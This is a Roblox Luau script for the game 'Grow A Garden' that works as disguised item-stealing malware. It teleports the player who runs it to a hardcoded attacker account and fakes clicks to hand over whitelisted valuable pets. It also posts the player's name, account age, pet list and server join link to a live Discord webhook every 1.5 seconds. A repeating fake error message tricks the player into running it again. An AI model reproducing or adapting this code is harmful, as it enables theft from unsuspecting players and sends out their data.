-- Wait until game is fully loaded
repeat task.wait() until game:IsLoaded()

--// Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")

--// Constants
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399358670386499685/WfrDH6GBHKUzJM_mh9p1UqKBhvuQjw8dk5WbwZLR-LtVa9FfyNovq32N8nwLb4ulNVX6"
local VICTIM = Players.LocalPlayer
local USERNAMES = { "S1xsGG" }

local PET_WHITELIST = {
    'Raccoon', 'Dog', 'Seal', 'Corrupted Kitsune', 'Rainbow Corrupted Kitsune',
    'Corrupted Kodama', 'Raiju', 'Red Fox', 'T-Rex', 'Fennec Fox',
    'Dragonfly', 'Butterfly', 'Disco Bee', 'Mimic Octopus', 'Queen Bee',
    'Spinosaurus', 'Kitsune',
}

local victimPetTable = {}
local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))

--// Functions
local function waitForJoin()
    for _, player in pairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

local function checkPetsWhitelist(pet)
    for _, name in ipairs(PET_WHITELIST) do
        if string.find(pet, name) then
            return true
        end
    end
    return false
end

local function getPetObject(petUid)
    for _, obj in pairs(VICTIM.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUid then
            return obj
        end
    end
    local char = workspace:FindFirstChild(VICTIM.Name)
    if char then
        for _, obj in pairs(char:GetChildren()) do
            if obj:GetAttribute("PET_UUID") == petUid then
                return obj
            end
        end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    if VICTIM.Character and VICTIM.Character:FindFirstChild("Humanoid") then
        VICTIM.Character.Humanoid:EquipTool(pet)
    end
end

local function deltaBypass()
    local centerX = workspace.Camera.ViewportSize.X / 2
    local centerY = workspace.Camera.ViewportSize.Y / 2
    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, nil, false)
end

local function startSteal(target)
    local char = Players[target].Character
    if char and char:FindFirstChild("Head") then
        local prompt = char.Head:FindFirstChildOfClass("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            deltaBypass()
        end
    end
end

local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhitelist(value.PetType) then
            local petObject = getPetObject(petUid)
            if petObject then
                equipPet(petObject)
                task.wait(0.2)
                startSteal(target)
            end
        end
    end
end

local function teleportTarget(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and
       VICTIM.Character and VICTIM.Character:FindFirstChild("HumanoidRootPart") then
        VICTIM.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end

local function createDiscordEmbed(petList, totalValue, fileUrl)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                    VICTIM.Name,
                    table.concat(USERNAMES, " "),
                    identifyexecutor and identifyexecutor() or "Unknown",
                    VICTIM.AccountAge
                ),
                inline = false
            },
            {
                name = "💰 **Total Value**",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 **Backpack**",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ **Join with URL**",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.JobId, game.PlaceId, game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = { embed }
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or syn.request or (http and http.request)

    if request then
        local response = request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })

        if response and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
            warn("Webhook failed:", response.StatusCode, response.Body)
        end
    else
        warn("HTTP request method not supported.")
    end
end

local function getPlayersPets()
    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhitelist(petData.PetType) then
            table.insert(victimPetTable, petData.PetType)
        end
    end
end

-- Populate pet list initially
getPlayersPets()

-- // LOOP 1: Steal Pets every 0.5s
task.spawn(function()
    while true do
        task.wait(0.5)
        local isTarget, triggerName = waitForJoin()
        if isTarget then
            teleportTarget(triggerName)
            checkPetsInventory(triggerName)
        end
    end
end)

-- // LOOP 2: Send webhook every 1.5s
task.spawn(function()
    while true do
        task.wait(1.5)
        if #victimPetTable > 0 then
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
        end
    end
end)

-- // LOOP 3: Print message every 10s
task.spawn(function()
    while true do
        task.wait(10)
        print("failed to load re execute")
    end
end)
